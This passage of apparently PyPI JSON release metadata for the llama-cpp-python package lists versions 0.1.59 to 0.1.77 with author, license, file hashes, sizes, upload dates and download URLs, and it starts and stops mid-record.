llama.cpp","version":"0.1.59","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"910f8156d3f1b6bbbea68f28df5e325a2863ed736362b0f93f7936acba424e70","md5":"07a7454cd5d727ee485511c37850a582","sha256":"e34c28167d9ad02935f7c914b282db34ac851f3f0dc3754e082d95fd81309a41"},"downloads":-1,"filename":"llama_cpp_python-0.1.59.tar.gz","has_sig":false,"md5_digest":"07a7454cd5d727ee485511c37850a582","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1442032,"upload_time":"2023-06-08T07:29:14","upload_time_iso_8601":"2023-06-08T07:29:14.919936Z","url":"https://files.pythonhosted.org/packages/91/0f/8156d3f1b6bbbea68f28df5e325a2863ed736362b0f93f7936acba424e70/llama_cpp_python-0.1.59.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.6":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.6/","requires_dist":null,"requires_python":"","summary":"A Python wrapper for llama.cpp","version":"0.1.6","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"9fd39904d8616a5af9515b8852c441472c930b780db1879f13cae240bd4eb05f","md5":"27a4782da32d4d95b752926a9b07f3e3","sha256":"1792dce32be2b54197ecdd9dc13261381acada45949d76e847d9ce11bb98a8e5"},"downloads":-1,"filename":"llama_cpp_python-0.1.6.tar.gz","has_sig":false,"md5_digest":"27a4782da32d4d95b752926a9b07f3e3","packagetype":"sdist","python_version":"source","requires_python":null,"size":514245,"upload_time":"2023-03-25T20:26:53","upload_time_iso_8601":"2023-03-25T20:26:53.059497Z","url":"https://files.pythonhosted.org/packages/9f/d3/9904d8616a5af9515b8852c441472c930b780db1879f13cae240bd4eb05f/llama_cpp_python-0.1.6.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.61":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.61/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.61","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"e9189531e94f7a4cd402cf200a9e6257fc08d162b8a8d57adf6f4049f60ba05b","md5":"282e890d234283316617da1b3a6601d9","sha256":"da0b4d1e6412e3788df3d8daa60fd79438fffabbc2b42e7e915a7041370c370f"},"downloads":-1,"filename":"llama_cpp_python-0.1.61.tar.gz","has_sig":false,"md5_digest":"282e890d234283316617da1b3a6601d9","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1446110,"upload_time":"2023-06-10T03:32:34","upload_time_iso_8601":"2023-06-10T03:32:34.598311Z","url":"https://files.pythonhosted.org/packages/e9/18/9531e94f7a4cd402cf200a9e6257fc08d162b8a8d57adf6f4049f60ba05b/llama_cpp_python-0.1.61.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.62":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.62/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.62","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"ccedfe9bbe6c4f2156fc5e887d9e669872bc1722f80a2932a78a8166d7a82877","md5":"4f0acd9c4087368dca9115fd220d65d3","sha256":"52beb03c63bad75bbc2070bc49fd9ec91e9b22fb426a80893072d16fc752add7"},"downloads":-1,"filename":"llama_cpp_python-0.1.62.tar.gz","has_sig":false,"md5_digest":"4f0acd9c4087368dca9115fd220d65d3","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1447872,"upload_time":"2023-06-10T22:26:06","upload_time_iso_8601":"2023-06-10T22:26:06.242157Z","url":"https://files.pythonhosted.org/packages/cc/ed/fe9bbe6c4f2156fc5e887d9e669872bc1722f80a2932a78a8166d7a82877/llama_cpp_python-0.1.62.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.63":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.63/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.63","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"a8017e39377ad0d20d2379b01b7019aad9b3595ea21ced1705ccc49c78936088","md5":"186a4d038857dc7711f7b3be53b3f7b7","sha256":"05d038f56e2751fa0cc46ec1df4489734e40bb29d9357bff3509221c9e897926"},"downloads":-1,"filename":"llama_cpp_python-0.1.63.tar.gz","has_sig":false,"md5_digest":"186a4d038857dc7711f7b3be53b3f7b7","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1484341,"upload_time":"2023-06-15T02:17:16","upload_time_iso_8601":"2023-06-15T02:17:16.673396Z","url":"https://files.pythonhosted.org/packages/a8/01/7e39377ad0d20d2379b01b7019aad9b3595ea21ced1705ccc49c78936088/llama_cpp_python-0.1.63.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.64":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.64/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.64","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"adc14083e90a0b31e1abb72d3f00f8d1403bdc9384301e1e370d0915f73519f5","md5":"4afc0d3b8e48333f87a088b9748c8412","sha256":"0d995d6fa8995795e0ec594b8f69ed86c788f681b806ed368418c0050d7576f2"},"downloads":-1,"filename":"llama_cpp_python-0.1.64.tar.gz","has_sig":false,"md5_digest":"4afc0d3b8e48333f87a088b9748c8412","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1504737,"upload_time":"2023-06-18T14:08:23","upload_time_iso_8601":"2023-06-18T14:08:23.638007Z","url":"https://files.pythonhosted.org/packages/ad/c1/4083e90a0b31e1abb72d3f00f8d1403bdc9384301e1e370d0915f73519f5/llama_cpp_python-0.1.64.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.65":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.65/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.65","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"847da659b65132db354147654bf2b6b2c8820b25aa10833b4849ec6b66e69117","md5":"2a517b61850d6fddb75b8ef37a2617c2","sha256":"c057801619aa5feac1e948bb8486fc5de6c024704746f135b7b9c7809841379c"},"downloads":-1,"filename":"llama_cpp_python-0.1.65.tar.gz","has_sig":false,"md5_digest":"2a517b61850d6fddb75b8ef37a2617c2","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1509430,"upload_time":"2023-06-20T15:29:37","upload_time_iso_8601":"2023-06-20T15:29:37.879764Z","url":"https://files.pythonhosted.org/packages/84/7d/a659b65132db354147654bf2b6b2c8820b25aa10833b4849ec6b66e69117/llama_cpp_python-0.1.65.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.66":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.66/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.66","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"59436dfbaed1f70ef013279b03e436b8f58f9f2ab0835e04034927fc31bb8fc9","md5":"247a6d707be1202c313210b573088029","sha256":"ff5441d9130fba490f9374140353441bb18e2d406e2c1e569a809b0a17ff1fa8"},"downloads":-1,"filename":"llama_cpp_python-0.1.66.tar.gz","has_sig":false,"md5_digest":"247a6d707be1202c313210b573088029","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1513605,"upload_time":"2023-06-26T12:55:24","upload_time_iso_8601":"2023-06-26T12:55:24.693894Z","url":"https://files.pythonhosted.org/packages/59/43/6dfbaed1f70ef013279b03e436b8f58f9f2ab0835e04034927fc31bb8fc9/llama_cpp_python-0.1.66.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.67":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.67/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.67","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"96793dbc78c1a6e14d088673d21549a736aa27ca69ef1734541a07c36f349cf7","md5":"324329a06d385e3afb1b7a18b4009091","sha256":"33bdcd42b30df3c21d56ce094132e1cdc0da0f8a27109f8eaf698addad02fd20"},"downloads":-1,"filename":"llama_cpp_python-0.1.67.tar.gz","has_sig":false,"md5_digest":"324329a06d385e3afb1b7a18b4009091","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1514117,"upload_time":"2023-06-29T05:03:07","upload_time_iso_8601":"2023-06-29T05:03:07.562999Z","url":"https://files.pythonhosted.org/packages/96/79/3dbc78c1a6e14d088673d21549a736aa27ca69ef1734541a07c36f349cf7/llama_cpp_python-0.1.67.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.68":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.68/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.68","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"870af99cdd3befe25e414f9a758fb89bf70ca5278d68430af140391fc262bb55","md5":"3d24654197936805458eea5673763789","sha256":"619ca317d771fc0c30ceba68c29c318287cd1cae2eaa14661aec675190295f19"},"downloads":-1,"filename":"llama_cpp_python-0.1.68.tar.gz","has_sig":false,"md5_digest":"3d24654197936805458eea5673763789","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1578323,"upload_time":"2023-07-05T05:08:19","upload_time_iso_8601":"2023-07-05T05:08:19.596641Z","url":"https://files.pythonhosted.org/packages/87/0a/f99cdd3befe25e414f9a758fb89bf70ca5278d68430af140391fc262bb55/llama_cpp_python-0.1.68.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.69":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.69/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.69","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"e6a286200ff91d374311fbb704079d95927edacfc47592ae34c3c48a47863eea","md5":"2ffd94b6fa1c039ca7392ada8ed28527","sha256":"40128e4ff4c09b4ec43ff3d7439a5d64bfcb3f4044810a086bb3d62105c97afc"},"downloads":-1,"filename":"llama_cpp_python-0.1.69.tar.gz","has_sig":false,"md5_digest":"2ffd94b6fa1c039ca7392ada8ed28527","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1585975,"upload_time":"2023-07-09T15:46:17","upload_time_iso_8601":"2023-07-09T15:46:17.621032Z","url":"https://files.pythonhosted.org/packages/e6/a2/86200ff91d374311fbb704079d95927edacfc47592ae34c3c48a47863eea/llama_cpp_python-0.1.69.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.7":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":[],"description_content_type":"","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.7/","requires_dist":null,"requires_python":"","summary":"A Python wrapper for llama.cpp","version":"0.1.7","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"20ffc192e4469e14be86d3b11fdee4b56aca486033e4256174e2cf8425840e54","md5":"a5fd8e51d357016fa79ae44d2af5232e","sha256":"c3f8d6a1894dd4bf9602ee3092b9990e6b3fc91cc3507b3a39dda5af7fbd2676"},"downloads":-1,"filename":"llama_cpp_python-0.1.7.tar.gz","has_sig":false,"md5_digest":"a5fd8e51d357016fa79ae44d2af5232e","packagetype":"sdist","python_version":"source","requires_python":null,"size":515563,"upload_time":"2023-03-26T18:00:16","upload_time_iso_8601":"2023-03-26T18:00:16.338658Z","url":"https://files.pythonhosted.org/packages/20/ff/c192e4469e14be86d3b11fdee4b56aca486033e4256174e2cf8425840e54/llama_cpp_python-0.1.7.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.70":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.70/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.70","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"78605cfb3842ef25db4ee1555dc2a70b99c569ad27c0438e7d9704c1672828b8","md5":"b88cad91c4bab372370e6bff2473313b","sha256":"616ea7ad87417eba9c76d6ffe060b855af39ab7e795032dcf19fc49a7e73806b"},"downloads":-1,"filename":"llama_cpp_python-0.1.70.tar.gz","has_sig":false,"md5_digest":"b88cad91c4bab372370e6bff2473313b","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1585986,"upload_time":"2023-07-09T22:26:24","upload_time_iso_8601":"2023-07-09T22:26:24.244664Z","url":"https://files.pythonhosted.org/packages/78/60/5cfb3842ef25db4ee1555dc2a70b99c569ad27c0438e7d9704c1672828b8/llama_cpp_python-0.1.70.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.71":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.71/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.71","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"4bd124602670353e3f08f07c9bf36dca5ef5466ac3c0d27b5d5be0685e8032a7","md5":"425fc40670c3afa341ec3d3d899871aa","sha256":"598b61862ab4e18e0acce5902ae8a9c1ece1554d4b87bf8bb7ad6a0b1660f3cd"},"downloads":-1,"filename":"llama_cpp_python-0.1.71.tar.gz","has_sig":false,"md5_digest":"425fc40670c3afa341ec3d3d899871aa","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1595877,"upload_time":"2023-07-14T03:35:44","upload_time_iso_8601":"2023-07-14T03:35:44.062580Z","url":"https://files.pythonhosted.org/packages/4b/d1/24602670353e3f08f07c9bf36dca5ef5466ac3c0d27b5d5be0685e8032a7/llama_cpp_python-0.1.71.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.72":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.72/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.72","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"7f59b17486fa68bd3bce14fad89e049ea2700cf9ca36e7710d9380e2facbe182","md5":"fa59bbf6be8790cbafae59be2849ebd9","sha256":"1520fa9751ff77ac4dea7837e224a77a5698eb7310eb4afbd5fbea1668f9ae0e"},"downloads":-1,"filename":"llama_cpp_python-0.1.72.tar.gz","has_sig":false,"md5_digest":"fa59bbf6be8790cbafae59be2849ebd9","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1600533,"upload_time":"2023-07-15T21:15:47","upload_time_iso_8601":"2023-07-15T21:15:47.959528Z","url":"https://files.pythonhosted.org/packages/7f/59/b17486fa68bd3bce14fad89e049ea2700cf9ca36e7710d9380e2facbe182/llama_cpp_python-0.1.72.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.73":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.73/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.73","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"c5c53bcee8d4fa2a3faef625dd1223e945ab15aa7d2f180158f30762eaa597b1","md5":"c4083fe14b5b400327f502ec4db55d5a","sha256":"09606fc0ebe9e752c4d40330811859406582411f5b9a18e3992031a20de1d898"},"downloads":-1,"filename":"llama_cpp_python-0.1.73.tar.gz","has_sig":false,"md5_digest":"c4083fe14b5b400327f502ec4db55d5a","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1603224,"upload_time":"2023-07-18T17:57:59","upload_time_iso_8601":"2023-07-18T17:57:59.814713Z","url":"https://files.pythonhosted.org/packages/c5/c5/3bcee8d4fa2a3faef625dd1223e945ab15aa7d2f180158f30762eaa597b1/llama_cpp_python-0.1.73.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.74":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.74/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.74","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"730999e6bf5d56e96a15a67628b15b705afbddf27279e6738018c4d7866d05c7","md5":"c3de58f9ee77390a64d05c53767dc42c","sha256":"406db14d9e1b32fccf0505c2aad74f349232aa860995663cfb2d3b52143c4376"},"downloads":-1,"filename":"llama_cpp_python-0.1.74.tar.gz","has_sig":false,"md5_digest":"c3de58f9ee77390a64d05c53767dc42c","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1606624,"upload_time":"2023-07-20T23:04:50","upload_time_iso_8601":"2023-07-20T23:04:50.821517Z","url":"https://files.pythonhosted.org/packages/73/09/99e6bf5d56e96a15a67628b15b705afbddf27279e6738018c4d7866d05c7/llama_cpp_python-0.1.74.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.76":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":null,"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.1.76/","requires_dist":null,"requires_python":">=3.7","summary":"A Python wrapper for llama.cpp","version":"0.1.76","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"b36185c4defcdd3157004611feff6c95e8b4776d8671ca754ff2ed91fbc85154","md5":"ece052cb0b37b42e0db1c517ef67b798","sha256":"139c6b7b9924ff2681d4ebc419592022c8882dd128c8cbf40edef58655c3aeca"},"downloads":-1,"filename":"llama_cpp_python-0.1.76.tar.gz","has_sig":false,"md5_digest":"ece052cb0b37b42e0db1c517ef67b798","packagetype":"sdist","python_version":"source","requires_python":">=3.7","size":1624410,"upload_time":"2023-07-24T17:17:17","upload_time_iso_8601":"2023-07-24T17:17:17.204414Z","url":"https://files.pythonhosted.org/packages/b3/61/85c4defcdd3157004611feff6c95e8b4776d8671ca754ff2ed91fbc85154/llama_cpp_python-0.1.76.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.1.77":{"info":{"author":"Andrei Betlen","author_email":"abetlen@gmail.com","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.7","Programming Language :: Python :: 3.8","Programming Language :: Python :: 